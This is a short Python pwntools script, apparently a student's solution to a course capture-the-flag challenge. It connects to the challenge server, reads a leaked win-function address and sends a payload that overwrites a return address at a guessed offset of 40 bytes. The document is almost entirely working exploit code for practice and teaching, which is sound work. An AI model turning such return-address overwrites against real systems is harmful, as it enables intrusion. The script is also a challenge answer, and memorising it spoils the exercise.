from pwn import *

#bpath = './format0-64'
#elf = ELF(bpath)
#context.binary = elf
context.log_level = 'debug'

'''
From leaks:
    [*] Address leaked at param 6 : 0xa70243625         // our input
    [*] Address leaked at param 11: 0x5555555547f0
    [*] Address leaked at param 13: 0x555555554a28

Either of the last two could be return address of calibrate()
'''

p = remote('cs4401shell.walls.ninja', 23231)

addr_win = hex(int(p.recvline()[:-1], 16))
print('win function addr: ', addr_win)

addr_win = p64(0x5555555548fa + 1)

# offset_ret = 40 I think overwrites return address 
# since that's the first value I start getting core dumps at
offset_ret = (11 - 6) * 8           
exploit_str = flat({offset_ret: addr_win}, filler=addr_win, length=64)

# ignore fgets() since it's only useful for leaks which we already have
p.sendline(b"a")

# send exploit string
p.sendline(exploit_str)
p.interactive()
